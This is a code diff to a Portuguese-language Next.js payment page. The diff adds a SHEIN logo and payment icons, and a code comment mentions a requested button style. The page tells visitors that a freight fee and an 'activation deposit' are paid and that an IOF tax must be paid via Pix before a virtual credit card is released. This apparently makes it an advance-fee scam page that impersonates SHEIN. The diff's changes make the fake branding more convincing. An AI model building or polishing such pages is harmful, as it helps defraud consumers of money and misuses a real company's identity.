@@ -92,11 +92,16 @@ export default function UppThanksPage() {
     <main className="min-h-screen bg-gray-50">
       <div className="max-w-md mx-auto p-4">
         <div className="bg-white rounded-2xl shadow-xl p-6">
-          {/* Header */}
+          {/* Header with SHEIN Logo */}
           <div className="mb-6">
             <button onClick={() => router.back()} className="mb-4 p-2 text-gray-600 hover:text-gray-800">
               <ArrowLeft className="w-5 h-5" />
             </button>
+
+            {/* SHEIN Logo */}
+            <div className="text-center mb-6">
+              <Image src="/shein-logo-updated.png" alt="SHEIN" width={120} height={40} className="mx-auto" priority />
+            </div>
 
             <h1 className="text-2xl font-bold mb-2 text-gray-800">
               Parabéns, finalize a última etapa para concluir a sua solicitação
@@ -125,7 +130,7 @@ export default function UppThanksPage() {
             </div>
           </div>
 
-          {/* Progress Steps */}
+          {/* Progress Steps with Custom Icons */}
           <div className="mb-6">
             <div className="space-y-4">
               {/* Pagamento Frete - Completed */}
@@ -135,7 +140,7 @@ export default function UppThanksPage() {
                 </div>
                 <div className="flex-1">
                   <div className="flex items-center space-x-2">
-                    <div className="w-6 h-4 bg-green-500 rounded"></div>
+                    <Image src="/favicon-frete.png" alt="Frete" width={24} height={16} className="object-contain" />
                     <span className="font-semibold text-green-700">Pagamento Frete</span>
                   </div>
                   <p className="text-sm text-green-600">Pagamento concluído com sucesso</p>
@@ -149,7 +154,7 @@ export default function UppThanksPage() {
                 </div>
                 <div className="flex-1">
                   <div className="flex items-center space-x-2">
-                    <div className="w-6 h-4 bg-green-500 rounded"></div>
+                    <Image src="/favicon-check.png" alt="Check" width={24} height={24} className="object-contain" />
                     <span className="font-semibold text-green-700">Depósito de Ativação</span>
                   </div>
                   <p className="text-sm text-green-600">Pagamento concluído com sucesso</p>
@@ -163,7 +168,7 @@ export default function UppThanksPage() {
                 </div>
                 <div className="flex-1">
                   <div className="flex items-center space-x-2">
-                    <div className="w-6 h-4 bg-red-500 rounded"></div>
+                    <Image src="/favicon-pix.png" alt="PIX" width={24} height={24} className="object-contain" />
                     <span className="font-semibold text-red-700">Pagamento do Imposto IOF</span>
                   </div>
                   <p className="text-sm text-red-600">Aguardando pagamento para liberação do cartão de crédito</p>
@@ -177,7 +182,13 @@ export default function UppThanksPage() {
                 </div>
                 <div className="flex-1">
                   <div className="flex items-center space-x-2">
-                    <div className="w-6 h-4 bg-gray-300 rounded"></div>
+                    <Image
+                      src="/favicon-card.png"
+                      alt="Card"
+                      width={24}
+                      height={16}
+                      className="object-contain opacity-50"
+                    />
                     <span className="font-semibold text-gray-500">Cartão Virtual Liberado</span>
                   </div>
                   <p className="text-sm text-gray-400">Cartão físico em preparação</p>
@@ -199,7 +210,7 @@ export default function UppThanksPage() {
             <div className="text-center mb-4">
               <div className="flex items-center justify-center space-x-2 mb-2">
                 <span className="text-lg font-bold">Pague via Pix</span>
-                <div className="w-6 h-6 bg-teal-500 rounded"></div>
+                <Image src="/favicon-pix.png" alt="PIX" width={24} height={24} className="object-contain" />
               </div>
               <p className="text-sm text-gray-600">O pagamento será confirmado imediatamente</p>
             </div>
@@ -249,7 +260,7 @@ export default function UppThanksPage() {
               </div>
             )}
 
-            {/* Pay Button */}
+            {/* Pay Button - BLACK with WHITE text as requested */}
             <button className="w-full bg-black text-white font-bold py-4 px-6 rounded-lg hover:bg-gray-800 transition-colors mb-4">
               Pagar agora
             </button>
